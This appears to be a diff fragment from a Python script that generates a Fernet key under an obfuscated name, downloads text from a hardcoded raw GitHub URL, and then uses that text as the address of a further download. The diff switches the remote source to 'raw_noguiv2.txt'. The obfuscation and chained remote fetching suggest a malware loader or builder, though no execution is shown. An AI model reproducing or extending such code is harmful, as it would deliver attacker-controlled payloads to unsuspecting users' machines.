@@ -235,7 +235,7 @@ if not os.path.exists(filexyz3):
     sys.exit()
 os.system('cls')
 def new_function_name(mycontent):
-    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/raw_aes3.0_nogui.txt'
+    raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_noguiv2.txt'
 
     crpppttkkyy = Fernet.generate_key()
     cipher_suite = Fernet(crpppttkkyy)
@@ -260,7 +260,7 @@ def new_function_name(mycontent):
     if raw2urlfinalresponse.status_code == 200:  
         content2 =  raw2urlfinalresponse.text
         if True:      
-            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/raw_aes3.0_nogui.txt'
+            rawfile_url = 'https://raw.githubusercontent.com/nvtsxlz/raws/refs/heads/main/raw_noguiv2.txt'
             rawresponse = requests.get(rawfile_url)
             rawcontent = rawresponse.text
             raw_url = rawcontent
